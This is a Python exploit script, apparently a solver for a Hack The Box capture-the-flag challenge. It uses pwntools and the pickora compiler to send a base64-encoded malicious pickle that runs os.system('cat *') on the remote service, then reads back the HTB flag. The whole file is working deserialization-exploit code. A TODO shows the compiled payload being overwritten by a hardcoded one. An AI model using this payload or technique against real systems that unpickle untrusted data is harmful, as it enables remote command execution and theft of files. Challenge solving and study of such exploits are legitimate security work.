from base64 import b64encode
from pickora import Compiler
from pwn import *
import os

def send_payload(payload):
    payload = b64encode(compiler.compile(payload))
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b': ')
    # TODO: solver wasn't working; this'll do for now
    payload = b"gASVeAAAAAAAAACMA2FwcJSMHm1lbnUuX19nbG9iYWxzX18uX19jbGFzc19fLmdldJOUaAFoAIwQbWVudS5fX2dsb2JhbHNfX5OMDF9fYnVpbHRpbnNfX4ZSjARleGVjhlKMHGltcG9ydCBvcwpvcy5zeXN0ZW0oJ2NhdCAqJymFUi4="
    io.sendline(payload)

def get_flag():
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'HTB{')
    flag = io.recvuntil(b'}')
    return b'HTB{' + flag

def pwn():
    send_payload(b"GLOBAL('app', 'random._os.system')('cat flag.txt')")
    flag = get_flag()
    print(flag)

if __name__ == '__main__':
    ip = "victim"
    port = 1337
    io = remote(ip, port)
    #io = process(['python', 'app.py'])
    compiler = Compiler()
    pwn()
